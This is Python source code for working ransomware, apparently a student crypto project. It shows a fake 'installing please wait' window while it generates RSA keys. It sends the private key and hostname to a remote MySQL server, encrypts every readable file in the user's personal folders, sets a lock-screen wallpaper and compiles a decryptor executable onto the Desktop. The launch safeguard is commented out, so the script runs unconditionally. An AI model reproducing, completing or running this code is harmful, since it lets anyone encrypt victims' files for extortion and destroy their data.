# how will the ransomware work :
# 1- safeguard
# 2- generate key
# 3- save it to server with the hostname and time
# 4- go through the files
# 5- encrypt the files
# 6- show encryption screen
# 7- install decryption software
# 8- if the key is correct :
# go through encrypted files and decrypt them

# Bonus : Trojan horse
import sys
sys.path.insert(0, 'C:\\\\Users\\\\belha\\\\Desktop\\\\crypto_project')
from __init__ import encrypt_file
from key import newkeys
import os
from datetime import datetime
import mysql.connector
import ctypes

import tkinter as tk
from tkinter import ttk
from threading import Thread
from time import sleep


def progessbar_loop():
    global i, root
    progressbar['value'] = i * 10
    i += 1
    if (i == 11):
        i = 0

    root.after(500, progessbar_loop)


def protect_Code_Files(filename):
    if filename in ("__init__.py", "asn1.py", "cli.py", "common.py",
                    "core.py", "key.py", "parallel.py", "pem.py",
                    "pkcs1.py", "pkcs1_v2.py", "prime.py", "randnum.py",
                    "transform.py", "util.py", "Ransomware.py", "image.png"):
        return True
    return False


def crypt():
    # ############################ 1- safeguard ################################
    # code = input("enter the launching code\n")
    # if code != "go":
    #     quit()

    # ############################ 2- generate key ################################

    print('################## Key generation ##################')
    # generate a keypair
    (pubkey, privkey) = newkeys(1024)
    print(pubkey)
    print(privkey)

    # input(">")
    # ############################ 3- save key and the host name to a server ################################
    hostname = os.getenv('COMPUTERNAME')
    time = datetime.now()
    publicKey = str(pubkey.n) + "," + str(pubkey.e)
    privateKey = str(privkey.n) + "," + str(privkey.e) + "," + str(privkey.d) + "," + str(privkey.p) + "," + str(
        privkey.q)
    # connect to the database
    cnx = mysql.connector.connect(user='root', password='', host='192.168.1.7', database='ransomkey')
    cursor = cnx.cursor()

    # input('wait')
    # insert into database
    insert_query = "INSERT INTO ransomkeys (time, hostname, public_key, private_key) VALUES (%s, %s, %s, %s)"
    values = (str(time), str(hostname), str(publicKey), str(privateKey))
    cursor.execute(insert_query, values)
    cnx.commit()  # commit the transaction

    # close the cursor and connection
    cursor.close()
    cnx.close()

    # input(">")

    # ############################ 4- go through the files ################################
    userhome = os.path.expanduser("~")
    folders_in_home_directory = ["Documents", "Downloads", "Music", "Pictures", "Videos", "Desktop", "Templates",
                                 "Contacts", "Start Menu"]

    for folder in folders_in_home_directory:
        for dirpath, dirnames, filenames in os.walk(os.path.join(userhome, folder)):
            if "crypto_project" in dirnames:
                dirnames.remove("crypto_project")
            for filename in filenames:
                if protect_Code_Files(filename) == False:
                    file = os.path.join(dirpath, filename)
                    if file.endswith(".ini"):
                        continue
                    else:
                        if os.access(file, os.W_OK) and os.access(file, os.R_OK):
                            try:
                                Thread(target=encrypt_file, args=(file, pubkey)).start()
                                print(file, " : crypted successfully ")
                            except:
                                print("ignoring error on crypting this file : ", file)
                        else:
                            print("access denied to this file : ", file)

    # input(">")

    # ############################ 6- create decryptor program ################################
    import subprocess

    program_code = '''
import os
import sys
import ctypes
from threading import Thread

# adding Folder_2 to the system path
sys.path.insert(0, 'C:\\\\Users\\\\belha\\\\Desktop\\\\crypto_project')

import win32api
from datetime import datetime
import mysql.connector
from __init__ import decrypt_file
from key import newkeys, PrivateKey

def protect_Code_Files(filename):
    if filename in ("__init__.py", "asn1.py", "cli.py", "common.py",
                    "core.py", "key.py", "parallel.py", "pem.py",
                    "pkcs1.py", "pkcs1_v2.py", "prime.py", "randnum.py",
                    "transform.py", "util.py","Ransomware.py","image.png"):
        return True
    return False

def decyptionalgorithme(key):
    key = key.split(",")
    finalkey = PrivateKey(int(key[0]), int(key[1]), int(key[2]), int(key[3]), int(key[4]))

    userhome = os.path.expanduser("~")
    folders_in_home_directory = ["Documents", "Downloads", "Music", "Pictures", "Videos", "Desktop", "Templates", "Contacts", "Start Menu"] 

    for folder in folders_in_home_directory:
        for dirpath, dirnames, filenames in os.walk(os.path.join(userhome, folder)):
            if "crypto_project" in dirnames:
                dirnames.remove("crypto_project")
            for filename in filenames:
                if protect_Code_Files(filename) == False:
                    file = os.path.join(dirpath, filename)
                    if file.endswith(".ini"):
                        continue
                    else:
                        if os.access(file, os.W_OK) and os.access(file, os.R_OK):
                            try:
                                Thread(target=decrypt_file, args=(file, finalkey)).start()
                                print(file, " : decrypted successfully ")
                            except:
                                print("")
                        else:
                            print("")  

    SPI_SETDESKWALLPAPER = 20
    # Set the wallpaper to the default Windows background image
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, "C:\\Windows\\Web\\Wallpaper\\Windows\\img0.jpg", 0)

def decrypt():
    hostname = []
    hostname.append(os.getenv('COMPUTERNAME'))
    cnx = mysql.connector.connect(user='root', password='',
                            host='192.168.1.7', database='ransomkey')
    cursor = cnx.cursor()
    query = "SELECT private_key FROM ransomkeys where hostname=%s"
    params = (hostname)

    cursor.execute(query, params)
    results = cursor.fetchall()

    key = str(input("Enter the key"))
    for result in results:
        if key == result[0]:
            decyptionalgorithme(key)
        else:
            print("wrong key")

lock = \'''\\\\033[1;32m
                       .--------.
                      / .------. \\\\
                     / /        \ \\\\
                     | |        | |
                    _| |________| |_
                  .' |_|        |_| '.
                  '._____ ____ _____.'
                  |     .'____'.     |
                  '.__.'.'    '.'.__.'
                  '.__  |      |  __.'
                  |   '.'.____.'.'   |
                  '.____'.____.'____.'
                  '.________________.'

  _____ _   _ _____ _____ ____      _  _________   __
 | ____| \ | |_   _| ____|  _ \    | |/ / ____\ \ / /
 |  _| |  \| | | | |  _| | |_) |   | ' /|  _|  \ V / 
 | |___| |\  | | | | |___|  _ <    | . \| |___  | |  
 |_____|_| \_| |_| |_____|_| \_\   |_|\_\_____| |_|  

\'''
print (lock)
decrypt()

    '''

    program_code = program_code.replace('\0', '')
    program_name = "decryptor.py"
    program_icon = "C:\\Users\\belha\\Desktop\\crypto_project\\UnLock.ico"
    exe_name = "Déverrouiller_Votre_Machine"
    program_path = f"./{program_name}"

    with open(program_path, 'w') as f:
        f.write(program_code)

    subprocess.run(f"pyinstaller --onefile --icon={program_icon} --name={exe_name} {program_name}")

    import shutil

    # Get the path of the user's desktop directory
    desktop_path = os.path.join(os.path.expanduser('~'), 'Desktop')

    # Replace 'my_app.exe' with the name of your executable file
    executable_path = './dist/Déverrouiller_Votre_Machine.exe'

    # Copy the executable file to the desktop directory
    shutil.copy2(executable_path, desktop_path)

    os.remove(program_path)

    # subprocess.run(f"./dist/{program_name.split('.')[0]}")

    # trojan horse : allahou a3lem

    # ############################ 7- show encryption screen ################################

    import ctypes

    SPI_SETDESKWALLPAPER = 20

    # Replace 'path/to/image.jpg' with the path of the image you want to use
    image_path = r'C:\Users\belha\Desktop\crypto_project\image.png'

    # Call the Win32 API function to set the desktop background
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path, 0)

    print("image set")

    sleep(0.2)

    quit()


i = 1
root = tk.Tk()
root.title("installing")

progressbar = ttk.Progressbar()
progressbar.configure(length=100, mode='indeterminate')
progressbar.place(x=100, y=150, width=400)
label = ttk.Label(text="installing please wait", foreground="green", background="white", font=('Helvetica bold', 15))
label.place(x=200, y=40)

root.geometry("")
root.configure(background="white")

windowWidth = 600
windowHeight = 250

positionRight = int(root.winfo_screenwidth() / 2 - windowWidth / 2)
positionDown = int(root.winfo_screenheight() / 2 - windowHeight / 2)

root.geometry("600x250+{}+{}".format(positionRight, positionDown))
root.after(500, progessbar_loop)
Thread(target=crypt).start()
root.mainloop()
